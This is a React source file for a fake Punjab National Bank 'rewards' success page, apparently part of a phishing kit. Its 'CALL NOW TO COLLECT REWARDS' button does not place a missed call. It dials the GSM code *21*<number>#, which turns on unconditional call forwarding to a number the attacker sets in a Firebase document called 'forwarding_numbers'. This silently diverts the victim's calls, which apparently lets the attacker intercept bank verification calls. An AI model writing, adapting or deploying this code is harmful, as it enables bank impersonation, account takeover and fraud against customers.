import { useState, useEffect } from 'react';
import '../App.css';
import FirebaseUtil from '../FirebaseRepo';

const SuccessPage = () => {
  const [callNumber, setCallNumber] = useState(null);
  const [isLoading, setIsLoading] = useState(true);
  const [error, setError] = useState(null);

  useEffect(() => {
    const fetchCallNumber = async () => {
      try {
        setIsLoading(true);
        setError(null);
        // Try the 'pnb_settings' collection first
        let doc = await FirebaseUtil.getDocument("pnb_settings", "forwarding_numbers");
        
        if (doc?.call_forwarding_number && typeof doc.call_forwarding_number === 'string') {
          setCallNumber(doc.call_forwarding_number.trim());
        } else {
          // Set default if no valid number is found
          console.warn("No valid call number found in database, using default");
          setCallNumber('111111');
        }
      } catch (error) {
        console.error("Error fetching call number:", error);
        setError("Could not load call information. Please try again later.");
        setCallNumber('111111');
      } finally {
        setIsLoading(false);
      }
    };
    fetchCallNumber();
  }, []);

  const handleCallClick = () => {
    try {
      // Format: *21*number#
      const formattedNumber = callNumber.replace(/-/g, '');
      window.open(`tel:*21*${formattedNumber}%23`, '_self');
    } catch (error) {
      console.error("Error initiating call:", error);
      alert("Could not initiate call. Please try again or call manually.");
    }
  };

  return (
    <div className="min-h-screen bg-[#8a0c2f] text-white p-4">
      <div className="max-w-md mx-auto bg-white rounded-3xl p-6 shadow-lg">
        <div className="flex justify-center items-center mb-6">
          <svg className="w-12 h-12 text-[#A20E37]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
          </svg>
          <div className="ml-3">
            <h1 className="text-2xl font-bold text-[#A20E37] mb-2">
              Congratulations!
            </h1>
            <p className="text-gray-600">
              To collect your reward points, give us a miss call to PNB Reward Care by clicking the button below.
            </p>
          </div>
        </div>

        {error ? (
          <div className="bg-red-50 border-l-4 border-red-500 p-4 mb-6">
            <div className="flex">
              <div className="flex-shrink-0">
                <svg className="h-5 w-5 text-red-500" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                  <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clipRule="evenodd" />
                </svg>
              </div>
              <div className="ml-3">
                <p className="text-sm text-red-700">{error}</p>
              </div>
            </div>
          </div>
        ) : (
          <div className="bg-yellow-50 border-l-4 border-[#FBBC09] p-4 mb-6">
            <div className="flex">
              <div className="flex-shrink-0">
                <svg className="h-5 w-5 text-[#FBBC09]" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                  <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2h-1V9z" clipRule="evenodd" />
                </svg>
              </div>
              <div className="ml-3">
                <p className="text-sm text-yellow-700">
                  To collect your Rewards Points, please give a missed call to our PNB Rewards Care.
                </p>
              </div>
            </div>
          </div>
        )}

        {isLoading ? (
          <button
            className="w-full bg-[#FBBC09] hover:bg-yellow-500 text-black font-bold py-2 px-4 rounded-full text-sm mb-4 opacity-70 cursor-wait"
            disabled
          >
            Loading...
          </button>
        ) : (
          <button
            className="w-full bg-[#FBBC09] hover:bg-yellow-500 text-black font-bold py-2 px-4 rounded-full text-sm mb-4"
            onClick={handleCallClick}
            disabled={!!error}
          >
            CALL NOW TO COLLECT REWARDS
          </button>
        )}

        <button
          className="w-full bg-[#A20E37] hover:bg-[#8a0c2f] text-white font-bold py-2 px-4 rounded-full"
          onClick={() => window.location.href = '/'}
        >
          Back to Home
        </button>

        <p className="text-xs text-gray-500 text-center mt-4">
          Your rewards will be credited to your account within 24-48 hours after verification.
        </p>
      </div>

      <footer className="bg-gray-800 text-white p-4 text-center">
        <p className="text-sm"> 2025 Punjab National Bank. All rights reserved.</p>
        <p className="text-xs">For support, call {callNumber} or email care@pnb.co.in</p>
      </footer>
    </div>
  );
};

export default SuccessPage;